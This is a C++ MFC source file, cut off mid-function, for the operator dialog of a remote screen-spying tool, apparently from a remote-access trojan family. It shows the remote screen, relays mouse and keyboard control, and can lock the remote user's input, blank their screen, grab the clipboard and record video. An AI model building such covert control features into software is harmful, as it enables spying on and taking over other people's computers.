// ScreenSpyDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "QuickScreenSpyDlg.h"
#include <new>
using namespace std;
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CQuickScreenSpyDlg dialog
enum
{
	IDM_SET_FLUSH = 0x0010,
	IDM_CONTROL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_BLANK_SCREEN,	// 黑屏
	IDM_CAPTURE_LAYER,	// 捕捉层
	IDM_SAVEDIB,		// 保存图片
	IDM_SAVEAVI_S,      // 保存录像
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板

	IDM_DEEP_16,
	IDM_DEEP_24,
	IDM_DEEP_32,

	IDM_QUALITY60,		// 清晰度低
	IDM_QUALITY85,		// 清晰度中
	IDM_QUALITY100,		// 清晰度高

	IDM_FPS_1,
	IDM_FPS_5,
	IDM_FPS_10,
	IDM_FPS_15,
	IDM_FPS_20,
	IDM_FPS_25,
	IDM_FPS_30,
};



CQuickScreenSpyDlg::CQuickScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CQuickScreenSpyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CQuickScreenSpyDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpScreenDIB = NULL;
	m_lpvRectBits = NULL;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SCREENSYP));
	m_IPAddress = m_pContext->szAddress;
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	m_bIsCtrl = false; // 默认不控制
	m_bCursorIndex = 1;
	m_bOnClose = FALSE;
	m_MYtagMSG = new MYtagMSG;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	m_LastCursorIndex = 1;
//	InitializeCriticalSection(&m_cs);
	m_nCount = 0;
	alldata = 0;
	m_nCountHeart = 0;
	pDeCompressionData = NULL;

}

void CQuickScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CQuickScreenSpyDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CQuickScreenSpyDlg, CDialog)
	//{{AFX_MSG_MAP(CQuickScreenSpyDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_SIZE()
	ON_WM_PAINT()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CQuickScreenSpyDlg message handlers
void CQuickScreenSpyDlg::OnCancel()
{
	// TODO: Add your message handler code here and/or call default
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	Sleep(200);
	if (!m_aviFile.IsEmpty())
	{
		KillTimer(132);
		m_aviFile = "";
		m_aviStream.Close();
	}
	::ReleaseDC(m_hWnd, m_hDC);
	DeleteDC(m_hMemDC);
	DeleteObject(m_hFullBitmap);
	//DeleteCriticalSection(&m_cs);
	if (m_lpvRectBits)
		SAFE_DELETE_AR(m_lpvRectBits);
	if (m_lpbmi)
		SAFE_DELETE_AR(m_lpbmi);
	if (m_lpbmi_rect)
		SAFE_DELETE_AR(m_lpbmi_rect);
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
	m_bIsCtrl = false;
	m_bOnClose = TRUE;
	SAFE_DELETE(m_MYtagMSG);
	SAFE_DELETE_AR(pDeCompressionData);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void CQuickScreenSpyDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	m_nCount++;
	alldata += m_pContext->m_DeCompressionBuffer.GetBufferLen();
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN_QUICK:
	{
		m_bIsFirst = false;
		nUnCompressLength_first = 0;
		memcpy(&nUnCompressLength_first, m_pContext->m_DeCompressionBuffer.GetBuffer(1), 4);
		try {
			SAFE_DELETE_AR(pDeCompressionData);
			pDeCompressionData = new BYTE[nUnCompressLength_first];
		}
		catch (bad_alloc&) {
			PostMessage(WM_CLOSE);
			return;
		}
		DWORD	destLen = nUnCompressLength_first;
		if (uncompress(pDeCompressionData, &destLen, m_pContext->m_DeCompressionBuffer.GetBuffer() + 5, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5) == Z_OK)
		{
			DrawFirstScreen(pDeCompressionData, destLen);
		}
		else
		{
			PostMessage(WM_CLOSE);
			return;
		}

	}
	break;
	case TOKEN_NEXTSCREEN_QUICK:
	{
		DWORD nUnCompressLength = 0;
		memcpy(&nUnCompressLength, m_pContext->m_DeCompressionBuffer.GetBuffer(1), 4);
		if (nUnCompressLength_first < nUnCompressLength)
		{
			nUnCompressLength_first = nUnCompressLength;
			try {
				TRACE("%s  	SAFE_DELETE_AR(pDeCompressionData);\r\n", __FUNCTION__);
				SAFE_DELETE_AR(pDeCompressionData);
				pDeCompressionData = new BYTE[nUnCompressLength_first];
			}
			catch (bad_alloc&) {
				PostMessage(WM_CLOSE);
				return;
			}
		}
		DWORD	destLen = nUnCompressLength;
		if (uncompress(pDeCompressionData, &destLen, m_pContext->m_DeCompressionBuffer.GetBuffer() + 5, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5) == Z_OK)
		{
			DrawNextScreenHome(pDeCompressionData, destLen);
		}
		else
		{
			PostMessage(WM_CLOSE);
			return;
		}

	}
	break;
	case TOKEN_BITMAPINFO_QUICK:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT_QUICK:
		UpdateLocalClipboard((char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	case TOKEN_SIZE_QUICK:
		memcpy(&m_rect, m_pContext->m_DeCompressionBuffer.GetBuffer() + 1, sizeof(RECT));
		return;
	default:
		TRACE("%s default error\r\n", __FUNCTION__);
		return;
	}
}

void CQuickScreenSpyDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("高速屏幕监控 \\\\ %s %d * %d 第%d帧  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));

	SetWindowText(str);
}



bool CQuickScreenSpyDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(_T("文件保存失败"));
		return false;
	}
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	return true;
}


void CQuickScreenSpyDlg::SendResetScreen(int	nBitCount)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET_QUICK;
	bBuff[1] = nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

void CQuickScreenSpyDlg::SendResetScreenFps(int	nfps)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_FPS_QUICK;
	bBuff[1] = nfps;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}


BOOL CQuickScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	// Set the icon for this dialog.  The framework does this automatically
	// when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("跟踪服务端鼠标(&T)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("锁定服务端鼠标和键盘(&L)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("服务端黑屏(&B)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, _T("捕捉层(导致鼠标闪烁)(&L)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("保存录像—必须安装Xvid录制视频解码器(&A)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY60, _T("清晰度低60/100"));
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY85, _T("清晰度中85/100"));
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY100, _T("清晰度高100/100"));
		pSysMenu->AppendMenu(MF_SEPARATOR);


		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_1, _T("FPS-1"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_5, _T("FPS-5"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_10, _T("FPS-10"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_15, _T("FPS-15"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_20, _T("FPS-20"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_25, _T("FPS-25"));
		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_30, _T("FPS-30"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, IDM_FPS_1, MF_BYCOMMAND);
	}
	// TODO: Add extra initialization here

	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;
	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;
	// 初始化窗口大小结构
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	m_lpvRectBits = new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
	SelectObject(m_hMemDC, m_hFullBitmap);
	GetClientRect(&rect);
	ScreenToClient(rect);
	m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
	m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	BYTE	bBuff = COMMAND_NEXT_QUICK;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}



void CQuickScreenSpyDlg::ResetScreen()
{

	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		SAFE_DELETE_AR(m_lpbmi);
		SAFE_DELETE_AR(m_lpbmi_rect);
		m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		DeleteObject(m_hFullBitmap);
		SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
		SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		if (m_lpvRectBits)
		{
			delete[] m_lpvRectBits;
			m_lpvRectBits = new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
		}
		SelectObject(m_hMemDC, m_hFullBitmap);

		GetClientRect(&rect);
		ScreenToClient(rect);
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));

	}

}


void CQuickScreenSpyDlg::DrawFirstScreen(PBYTE pDeCompressionData, unsigned long	destLen)
{
	bool	bIsReDraw = false;
	BYTE	algorithm = pDeCompressionData[0];
	LPVOID	lpFirstScreen = pDeCompressionData + 1;
	DWORD	dwFirstLength = destLen - 1;
	if (algorithm == COMMAND_SCREEN_ALGORITHM_HOME && dwFirstLength > 0)
	{
		if (JPG_BMP(m_lpbmi->bmiHeader.biBitCount, lpFirstScreen, dwFirstLength, m_lpScreenDIB))
			bIsReDraw = true;
	}

	m_bIsFirst = false;
	if (bIsReDraw)
	{
#if _DEBUG
		DoPaint();
#else
		PostMessage(WM_PAINT);
#endif
	}
}

void CQuickScreenSpyDlg::DrawNextScreenHome(PBYTE pDeCompressionData, unsigned long	destLen)
{
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + sizeof(POINT) + sizeof(BYTE); //  算法[1] + 光标位置[8] + 光标类型索引[1]
	LPVOID	lpNextScreen = pDeCompressionData + nHeadLength;
	DWORD	dwNextLength = destLen - nHeadLength;
	DWORD	dwNextOffset = 0;

	// 判断鼠标是否移动
	LPPOINT	lpNextCursorPos = (LPPOINT)(pDeCompressionData + 1);
	if (memcmp(lpNextCursorPos, &m_RemoteCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
	{
		bIsReDraw = true;
		memcpy(&m_RemoteCursorPos, lpNextCursorPos, sizeof(POINT));
	}

	// 光标类型发生变化
// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	LPBYTE lpNextCursorIndex = (LPBYTE)(pDeCompressionData + 9);
	if (*lpNextCursorIndex != m_bCursorIndex)
	{
		m_bCursorIndex = *lpNextCursorIndex;
		if (m_bIsTraceCursor)
			bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}
	// 屏幕数据是否变化
	while (dwNextOffset < dwNextLength)
	{
		int* pinlen = (int*)((LPBYTE)lpNextScreen + dwNextOffset);

		if (JPG_BMP(m_lpbmi->bmiHeader.biBitCount, pinlen + 1, *pinlen, m_lpvRectBits))
		{
			bIsReDraw = true;
			LPRECT lpChangedRect = (LPRECT)((LPBYTE)(pinlen + 1) + *pinlen);
			int nChangedRectWidth = lpChangedRect->right - lpChangedRect->left;
			int nChangedRectHeight = lpChangedRect->bottom - lpChangedRect->top;

			m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
			m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
			m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
				* nChangedRectHeight;

		//	EnterCriticalSection(&m_cs);
			//m_clcs.lock();
			StretchDIBits(m_hMemDC, lpChangedRect->left, lpChangedRect->top, nChangedRectWidth, nChangedRectHeight,
				0, 0, nChangedRectWidth, nChangedRectHeight, m_lpvRectBits, m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);
			///LeaveCriticalSection(&m_cs);
			//m_clcs.unlock();
			dwNextOffset += sizeof(int) + *pinlen + sizeof(RECT);
		}
	}

	if (bIsReDraw)
	{
#if _DEBUG
		DoPaint();
#else
		//PostMessage(WM_PAINT);
		DoPaint();
#endif
	}
}




void CQuickScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;

	GetClientRect(&rect);
	ScreenToClient(rect);
	if (!m_bIsFirst)
	{
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
	}
}

void  CQuickScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case SC_MAXIMIZE:
		OnNcLButtonDblClk(HTCAPTION, NULL);
		return;
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_SET_FLUSH:
	{
		BYTE	bToken = COMMAND_FLUSH_QUICK;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	break;
	case IDM_TRACE_CURSOR: // 跟踪服务端鼠标
	{
		m_bIsTraceCursor = !m_bIsTraceCursor;
		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
		if (m_bIsCtrl)
		{
			if (!m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
		}
		// 重绘消除或显示鼠标
		PostMessage(WM_PAINT);
	}
	break;
	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLOCK_INPUT_QUICK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_BLANK_SCREEN: // 服务端黑屏
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLANK_QUICK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_CAPTURE_LAYER: // 捕捉层
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER_QUICK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI_S:
	{

		if (pSysMenu->GetMenuState(IDM_SAVEAVI_S, MF_BYCOMMAND) & MF_CHECKED)
		{
			KillTimer(132);
			pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_UNCHECKED);
			m_aviFile = "";
			m_aviStream.Close();

			return;
		}

		if (m_lpbmi->bmiHeader.biBitCount <= 15)
		{
			AfxMessageBox(_T("不支持16位及以下颜色录像"));
			return;
		}

		CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
		CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
		if (dlg.DoModal() != IDOK)
			return;

		m_aviFile = dlg.GetPathName();


		if (!m_aviStream.Open(m_hWnd, m_aviFile, m_lpbmi))
		{
			m_aviFile = _T("");
			MessageBox(_T("Create Video(*.avi) Failed"));
		}
		else
		{
			::SetTimer(m_hWnd, 132, 250, NULL);
			pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_CHECKED);
		}


	}
	break;
	case IDM_GET_CLIPBOARD: // 获取剪贴板
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD_QUICK;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SET_CLIPBOARD: // 设置剪贴板
	{
		SendLocalClipboard();
	}
	break;
	case IDM_DEEP_16:  //16
	{
		SendResetScreen(16);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_24:  //24
	{SendResetScreen(24);
	pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_24, MF_BYCOMMAND);
	}
	break;
	case IDM_DEEP_32:  // 32
	{
		SendResetScreen(32);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
	}
	break;
	case IDM_QUALITY60:  // 清晰度60
	{
		BYTE	bToken = COMMAND_COMMAND_SCREEN_UALITY60;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY60, MF_BYCOMMAND);
	}
	break;
	case IDM_QUALITY85:  // 清晰度85
	{
		BYTE	bToken = COMMAND_COMMAND_SCREEN_UALITY85;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
	}
	break;
	case IDM_QUALITY100:  // 清晰度100
	{
		BYTE	bToken = COMMAND_COMMAND_SCREEN_UALITY100;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY100, MF_BYCOMMAND);
	}
	break;
	case IDM_FPS_1:
		SendResetScreenFps(1);
		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
		break;
	case IDM_FPS_5:
	case IDM_FPS_10:
	case IDM_FPS_15:
	case IDM_FPS_20:
	case IDM_FPS_25:
	case IDM_FPS_30:
		SendResetScreenFps((nID - IDM_QUALITY100 - 1) * 5);
		pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}


void CQuickScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);
	COLORREF oldbgcol = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText(m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
	/*	InvalidateRect(NULL, FALSE);*/
}
//
//#define  TraceMAXSTRING    1024
//
//inline void Trace(const  char* format, ...)
//{
//#if _DEBUG
//#define  TraceEx _snprintf(szBuffer,TraceMAXSTRING,"%s(%d): ", \
//     & strrchr(__FILE__, ' \\ ' )[ 1 ],__LINE__); \
//    _RPT0(_CRT_WARN,szBuffer); \
//    Trace
//	static   char  szBuffer[TraceMAXSTRING];
//	va_list args;
//	va_start(args, format);
//	int  nBuf;
//	nBuf = _vsnprintf_s(szBuffer,
//		TraceMAXSTRING,
//		format,
//		args);
//	va_end(args);
//
//	_RPT0(_CRT_WARN, szBuffer);
//#endif
//
//}



BOOL CQuickScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
	static int i = 0;
	switch (pMsg->message)
	{
	case WM_MOUSEMOVE:
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEWHEEL:
	{

		if (!m_bIsCtrl) 	return TRUE;
		m_MYtagMSG->message = pMsg->message;
		m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + m_rect.left);
		m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + m_rect.top);
		m_MYtagMSG->wParam = pMsg->wParam;
		LPBYTE lpData = new BYTE[m_MYtagMSGsize + 1];
		lpData[0] = COMMAND_SCREEN_CONTROL_QUICK;
		memcpy(lpData + 1, m_MYtagMSG, m_MYtagMSGsize);
		m_iocpServer->Send(m_pContext, lpData, m_MYtagMSGsize + 1);
		SAFE_DELETE_AR(lpData)

	}
	break;
	case WM_KEYDOWN:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL) & 0x8000 && GetKeyState(VK_MENU) & 0x8000)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			return TRUE;
		}

	case WM_KEYUP:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL) & 0x8000 && GetKeyState(VK_MENU) & 0x8000)
		{
			return TRUE;
		}
	case WM_SYSKEYUP:
	case WM_SYSKEYDOWN:
		if (pMsg->wParam != VK_SCROLL)
		{
			if (!m_bIsCtrl) 	return TRUE;
			m_MYtagMSG->message = pMsg->message;
			m_MYtagMSG->x = (int)(((LONG)LOWORD(pMsg->lParam)) * m_wZoom + m_rect.left);
